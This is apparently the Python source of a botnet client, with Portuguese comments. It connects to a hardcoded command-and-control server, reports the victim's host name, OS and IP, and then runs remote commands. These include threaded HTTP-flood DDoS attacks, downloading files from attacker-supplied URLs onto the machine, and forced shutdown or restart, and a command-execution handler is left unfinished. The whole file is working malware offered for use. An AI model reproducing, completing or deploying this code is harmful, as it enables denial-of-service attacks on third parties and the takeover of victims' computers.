# coding=utf-8

import sys
import os
import time
import base64
import platform
import socket

import getpass
import hashlib
import requests
import thread


'''
Exemple commands

  bot_commands = {
	  	'Command_Bot.alive{"False"}' : '',
	  	'Command_Bot.ddos{"192.168.0.1", 80, 1, packages}': 'Simple ddos',
     'Command_Bot.Addos{"192.168.0.1", 80, 5, packages}': 'Advanced ddos'
    }
'''

def Download_file(File_Url, Path): # falta adicionar o commando! 

  file_name = File_Url.split('/')
  file_name = str(file_name[len(file_name) -1])
  file_local = str(Path + file_name)

  get_file = requests.get(File_Url)

  if(get_file.status_code == 200):

    try:

      down_file = open(file_local, 'w')
      down_file.write(get_file.content)
      down_file.close()

    except:

      pass # Depois fazer tratamentos de erros no codigo 

  else:

    pass # Depois fazer tratamentos de erros no codigo


def Command_Format(raw_command):

  if(raw_command.split('.')[0] == 'Command_Bot'):

    format_command = []

    type_command = str(raw_command.split('.')[1].split('{')[0])
    format_command = str(raw_command.split('{')[1].split('}')[0])

    return type_command, format_command

  else:
    return False


def Bot_register(bot_socket, pc_name, operation_system, operation_system_version):
  
  bot_addrres = bot_socket.getsockname()[0]

  rg_os = str(operation_system + ' ' + operation_system_version)
  rg_string = str('Server.RG{%s, %s, %s}' %(pc_name, rg_os, bot_addrres))

  rg_boll = True

  while rg_boll:

    try:
      bot_socket.send(rg_string.encode('ascii'))
      rg_boll = False
      
      return True

    except:
      rg_boll = True

      return False


def Bot_ping(ping_value, bot_socket):
  
  bot_addrres = str(socket.gethostbyname(socket.gethostname()))
  ping_string = str('Server.PING{%i, %s}' %(ping_value, bot_addrres)) # Server.PING{value, my_ip}

  ping_boll = True

  while ping_boll:
    
    try:
      bot_socket.send(ping_string.encode('ascii'))
      ping_boll = False

      return True
    
    except:
      ping_boll = True

      return False


def Command_Exec(type_command, format_command, bot_socket):

  import http_flood

  commands = {
    'Ddos'  : True,
    'Down' : True,
    'Cmdexec' : True,
    'Shutdown': True,
    'Restart' : True
  }

  if(type_command == 'alive'):

    Bot_ping(1, bot_socket) 

  elif(commands[type_command]):

    if(type_command == 'Ddos'):

      h_host = str(format_command.split(',')[0]).replace('"', '')
      h_port = int(format_command.split(',')[1])
      h_threads = int(format_command.split(',')[2])
      h_packages = int(format_command.split(',')[3])

      for i in range(0, h_threads, 1):

        thread.start_new_thread(http_flood.Main_Flood, (h_host, h_port, h_packages))

      return True

    elif(type_command == 'Down'):
      
      File_Url = str(format_command.split(',')[0].replace('"', ''))
      File_Path = str(format_command.split(',')[1])

      Download_file(File_Url, File_Path)
      
      return True
    
    elif(type_command == 'Cmdexec'):
      
      #Function 
      
      return True

    elif(type_command == 'Shutdown'):
      
      os.system('shutdown -s -t 00')

      return True

    elif(type_command == 'Restart'):
      
      os.system('shutdown -r -t 00')
      
      return True

    else:

      return False

  else:# novos comandos novas estruturas logicas

    return False


def main():

  data_command = str('')

  server_ip = str('192.168.0.13')
  server_port = int(9878)

  sys_information = platform.uname()

  pc_name = sys_information[1]
  current_user = getpass.getuser()

  operation_system = sys_information[0]
  operation_system_version = sys_information[2]

  bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  bot_socket.connect((server_ip, server_port))

  time.sleep(3)
  connection_loop = Bot_register(bot_socket, pc_name, operation_system, operation_system_version)

  while(connection_loop):
    data_command = bot_socket.recv(1024)

    if(data_command != ''):

      type_command, format_command = Command_Format(data_command)

      Command_Exec(type_command, format_command, bot_socket)
      # E necessario um time para o processo nao morrer, Talvez editar  o http_flood ja que o time dele nao funciona
      # Falta desenvolver as outras funcoes!

    else:

      pass


if __name__ == '__main__':
  main()
